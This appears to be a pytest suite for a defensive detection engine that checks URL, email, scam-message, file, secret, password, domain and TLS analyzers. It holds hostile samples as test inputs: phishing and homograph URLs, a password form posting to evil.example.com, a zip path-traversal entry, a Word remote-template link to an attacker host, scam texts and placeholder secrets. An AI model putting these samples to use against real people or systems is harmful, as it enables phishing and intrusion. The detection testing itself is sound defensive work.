"""Detection-engine v2.0 — golden corpus, adversarial/evasion suite,
determinism and schema tests.

Every case here is a behaviour the v2 upgrade promised: typed signals
with prevention on every result, the new evasion detectors, the new
playbooks, the secret scanner's redaction contract, and scores that
are reproducible run over run.
"""

import io
import json
import zipfile

from app.modules import secret_scanner
from app.modules.domain_checker import evaluate_domain
from app.modules.email_analyzer import analyze_email
from app.modules.file_scanner import scan_file
from app.modules.message_analyzer import analyze_message
from app.modules.password_lab import assess_password
from app.modules.tls_inspector import grade_certificate
from app.modules.url_analyzer import analyze_url

ENRICHMENT_KEYS = {"signals", "summary", "prevention", "confidence", "verdict_band", "meta"}


def _codes(result) -> set[str]:
    return {f["code"] for f in result["findings"]}


# ── Schema / enrichment ──────────────────────────────────────────────

def test_url_result_carries_v2_layer():
    r = analyze_url("http://192.168.10.5/paypal/login/verify").as_dict()
    assert ENRICHMENT_KEYS <= set(r)
    assert r["meta"]["schema_version"] == "2.0"
    assert r["risk_score"] == 85 and r["verdict"] == "malicious"  # legacy fields untouched
    assert r["verdict_band"] == "malicious"
    for signal in r["signals"]:
        assert signal["prevention"], f"signal {signal['id']} has no prevention"
        assert signal["severity"] in ("info", "low", "medium", "high", "critical")
        assert 0 < signal["confidence"] <= 1
    assert r["prevention"] and r["prevention"][0]["priority"] == 1


def test_every_engine_result_is_enriched(client):
    checks = [
        ("/api/tools/url", {"url": "https://example.com/login"}),
        ("/api/tools/email", {"headers": "From: a@b.com", "body": "hello"}),
        ("/api/tools/message", {"text": "hello there friend"}),
        ("/api/tools/secret-scan", {"text": "nothing to see here"}),
    ]
    for path, payload in checks:
        body = client.post(path, json=payload).json()
        assert ENRICHMENT_KEYS <= set(body), path
        assert body["meta"]["schema_version"] == "2.0", path


def test_determinism_same_input_same_verdict():
    samples = [
        analyze_url("https://paypal-secure.pages.dev/verify").as_dict(),
        analyze_url("https://paypal-secure.pages.dev/verify").as_dict(),
        analyze_message("share your OTP now"),
        analyze_message("share your OTP now"),
    ]
    assert samples[0]["risk_score"] == samples[1]["risk_score"]
    assert [f["code"] for f in samples[0]["findings"]] == [f["code"] for f in samples[1]["findings"]]
    assert samples[2]["risk_score"] == samples[3]["risk_score"]


# ── URL adversarial corpus ───────────────────────────────────────────

def test_url_zero_width_and_unicode_evasions():
    r = analyze_url("http://payp​al.com.evil.example.com/login")
    assert r.risk_score >= 40
    homograph = analyze_url("http://paypaг.com/login")  # Cyrillic г
    assert "unicode-host" in _codes(homograph.as_dict())
    assert "mixed-script-host" in _codes(homograph.as_dict())


def test_url_embedded_credentials_and_blob():
    r = analyze_url("https://user:s3cret@evil.example.com/")
    assert "embedded-credentials" in _codes(r.as_dict())
    blob = analyze_url("blob:https://evil.example.com/1234")
    assert "dangerous-scheme" in _codes(blob.as_dict())


def test_url_free_host_lure_and_double_encoding():
    r = analyze_url("https://account-verify.pages.dev/login")
    assert "free-host-abuse" in _codes(r.as_dict())
    legit = analyze_url("https://myproject.pages.dev/")
    assert "free-host-abuse" not in _codes(legit.as_dict())
    enc = analyze_url("http://example.com/%252e%252e/admin")
    assert "double-encoded" in _codes(enc.as_dict())


# ── Email: BEC expansion ─────────────────────────────────────────────

def test_email_bec_payroll_and_credential_form():
    headers = "From: CEO <ceo@company.com>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\n"
    r = analyze_email(headers, "Please update my direct deposit — salary will be paid to a new account.")
    assert "bec-payroll" in _codes(r)
    r2 = analyze_email(headers, '<form action="https://evil.example.com"><input type="password"></form>')
    assert "credential-form" in _codes(r2)
    r3 = analyze_email(
        "From: a@company.com\nMessage-ID: <x@other.net>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\n",
        "notes attached",
    )
    assert "messageid-mismatch" in _codes(r3)


# ── Message: playbooks + false-positive guard ────────────────────────

def test_message_new_playbooks():
    assert "parcel-scam" in _codes(analyze_message("Your parcel is held — pay customs fee Rs 49: http://x.xyz"))
    assert "family-emergency" in _codes(analyze_message("Hi mum, this is my new number. I am in trouble, please send money, do not tell anyone"))
    assert "tech-support-scam" in _codes(analyze_message("Microsoft support: your computer has a virus, install AnyDesk now"))
    assert "investment-scam" in _codes(analyze_message("Join our trading group for stock tips with guaranteed income"))


def test_message_bank_disclaimer_is_not_bait():
    r = analyze_message("Your bank never asks for OTP. Never share your OTP, PIN or CVV with anyone.")
    assert "credential-bait" not in _codes(r)
    assert r["risk_score"] < 20


# ── File: format-specific detectors ──────────────────────────────────

def test_file_pdf_active_content_and_archive_abuse():
    r = scan_file("doc.pdf", b"%PDF-1.5 fake /JavaScript /OpenAction content")
    assert "pdf-active-content" in _codes(r)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("../evil.exe", "MZ")
        z.writestr("inner.zip", "PK")
    r2 = scan_file("bundle.zip", buf.getvalue())
    assert "archive-traversal" in _codes(r2) and "nested-archive" in _codes(r2)


def test_file_remote_template_injection():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/_rels/document.xml.rels",
                   '<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example.com/t.dotm" TargetMode="External"/>')
    r = scan_file("invoice.docx", buf.getvalue())
    assert "remote-template" in _codes(r)


# ── Secret scanner ───────────────────────────────────────────────────

SECRET_BLOB = (
    "AKIAIOSFODNN7EXAMPLE\n"
    "token = ghp_1234567890abcdefghijklmnopqrstuvwxyz\n"
    "postgres://admin:Sup3rSecretPW@db.example.com:5432/app\n"
    "card 4111 1111 1111 1111\n"
)


def test_secret_scanner_finds_and_redacts():
    r = secret_scanner.scan_secrets(SECRET_BLOB)
    assert r["risk_score"] >= 70
    assert {"secret-aws-key", "secret-github-token", "secret-db-uri", "secret-card-number"} <= _codes(r)
    blob = json.dumps(r)
    for raw in ("AKIAIOSFODNN7EXAMPLE", "ghp_1234567890abcdefghijklmnopqrstuvwxyz",
                "Sup3rSecretPW", "4111 1111 1111 1111"):
        assert raw not in blob, f"raw secret leaked: {raw}"
    assert r["redacted"] is True


def test_secret_scanner_noisy_or_compounds():
    one = secret_scanner.scan_secrets("AKIAIOSFODNN7EXAMPLE")
    many = secret_scanner.scan_secrets(SECRET_BLOB)
    assert many["risk_score"] > one["risk_score"]
    clean = secret_scanner.scan_secrets("team lunch on Friday, bring your own cup")
    assert clean["risk_score"] == 0 and clean["secrets_found"] == 0


def test_secret_scan_endpoint(client):
    r = client.post("/api/tools/secret-scan", json={"text": SECRET_BLOB})
    assert r.status_code == 200
    assert "Sup3rSecretPW" not in r.text


# ── Password patterns ────────────────────────────────────────────────

def test_password_patterns_cap_scores():
    assert assess_password("qwerty123!X")["score"] <= 30
    assert "keyboard-walk" in assess_password("qwerty123!X")["patterns"]
    assert assess_password("P@ssw0rd2024")["score"] <= 30  # leet dictionary + year
    strong = assess_password("Tr7!mango-BICYCLE-92#quartz")
    assert strong["score"] >= 70 and strong["patterns"] == []


# ── Domain / TLS posture additions (scores unchanged) ────────────────

_BASE_RECORDS = {
    "a": ["1.2.3.4"], "aaaa": [], "mx": ["10 mail.example.com"], "ns": ["ns1.example.com"],
    "spf": ["v=spf1 include:_spf.google.com -all"], "dmarc": ["v=DMARC1; p=reject"],
    "caa": [], "cname": [], "cname_resolves": True, "dkim": [], "rdap_created": None,
}


def test_domain_posture_notes_do_not_change_score():
    base = evaluate_domain("example.com", dict(_BASE_RECORDS))
    noted = evaluate_domain("example.com", {
        **_BASE_RECORDS,
        "spf": ["v=spf1 " + " ".join(f"include:s{i}.example.com" for i in range(12)) + " -all"],
        "dmarc": ["v=DMARC1; p=reject; pct=50; sp=none"],
        "dkim": [{"selector": "google", "key_bits": 512}],
    })
    assert noted["score"] == base["score"]
    codes = _codes(noted)
    assert {"spf-too-many-lookups", "dmarc-partial", "dmarc-subdomain-gap", "dkim-present", "dkim-weak-key"} <= codes


def test_tls_weak_signature_flagged_without_score_change():
    cert = {
        "subject": ((("commonName", "example.com"),),),
        "issuer": ((("organizationName", "Test CA"),),),
        "subjectAltName": (("DNS", "example.com"),),
        "notAfter": "Dec 31 23:59:59 2099 GMT",
    }
    good = grade_certificate("example.com", cert, "TLSv1.3", True)
    weak = grade_certificate("example.com", {**cert, "signatureAlgorithm": "sha1WithRSAEncryption",
                                             "keyInfo": "RSA 1024-bit"}, "TLSv1.3", True)
    assert weak["score"] == good["score"]
    codes = _codes(weak)
    assert "tls-weak-signature" in codes and "tls-weak-key" in codes
